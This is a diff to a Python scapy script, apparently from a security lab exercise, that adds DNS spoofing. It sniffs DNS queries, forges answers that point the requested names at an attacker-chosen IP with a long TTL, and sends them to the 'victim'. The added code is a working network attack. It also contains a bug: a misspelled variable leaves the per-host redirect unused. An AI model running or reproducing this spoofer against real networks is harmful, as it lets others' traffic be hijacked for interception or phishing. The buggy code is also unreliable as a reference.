@@ -4,6 +4,8 @@ import argparse
 import socket
 from scapy.all import *
 
+#SET DEFAULT DST HERE IF NOT SPECIFYING HOSTNAMES FILE
+defaultDst = '10.0.2.15'.encode('UTF-8')
 hostnames = None
 
 def sniffLive(interfaceName, bpf):
@@ -16,7 +18,7 @@ def isRelevant(pkt):
     retval = True
 
     #test if packet is DNS request
-    if(not pkt.haslayer(DNS) or not pkt[DNS].qr == 0):  #or not pkt.
+    if (not pkt.haslayer(DNS) or not pkt[DNS].qr == 0):
         return False
 
     #test if packet hostname matches a specified hostname
@@ -24,15 +26,53 @@ def isRelevant(pkt):
         retval = pkt[DNS].qd.qname in hostnames
     return retval
 
+
+#given dns query: pkt, and ip fakeDst
+#returns dns response pkt pointing to fakeDst
+def forgeResponse(pkt, fakeDst):
+    fResponse = Ether()/IP()/UDP()/DNS(pkt[DNS])
+
+    fResponse[DNS].qr = 1
+    fResponse[DNS].ra = 1
+    fResponse[DNS].ancount = 1
+    rD = scapy.layers.dns.DNSRR(rrname=pkt[DNS].qd.qname, type='A', rclass ='IN', ttl=50000, rdata=fakeDst)
+    fResponse[DNS].an = rD
+
+    fResponse[UDP].dport = pkt[UDP].sport
+    fResponse[UDP].sport = pkt[UDP].dport
+
+    fResponse[IP].dst = pkt[IP].src
+    fResponse[IP].src = pkt[IP].dst
+       
+    fResponse[Ether].dst = pkt[Ether].src
+    fResponse[Ether].src = pkt[Ether].dst
+
+    return fResponse
+
 def processPacket(pkt):
     if(isRelevant(pkt)):
-        print(pkt[DNS].summary())
+        #print(pkt[DNS].summary())
         #pkt[DNS].show2()
 
         #identify redirect destination (current machine or other specified ip)
-        #identify other fields necessary to forge packet
+        fakeDst = ''
+        if hostnames == None:
+            fakeDst = defaultDst
+        else:
+            fakeDest = hostnames[pkt[DNS].qd.qname]
+
         #forge response packet
+        fResponse = forgeResponse(pkt, fakeDst)
+
+        print('Victim request:')
+        print(pkt.summary())
+        print('Forged response:')
+        print(fResponse.summary())
+
         #send forged packet
+        send(fResponse[IP])
+        print()
+
     else:
         return
     return
@@ -55,6 +95,7 @@ def loadHostnamesFile(hostnamesFile):
             currentHostname, currentIP = m.groups()
 
             currentHostname = currentHostname.encode('utf-8')
+            currentIP = currentIP.encode('utf-8')
 
             print('h:{}, ip:{}'.format(currentHostname, currentIP))
 
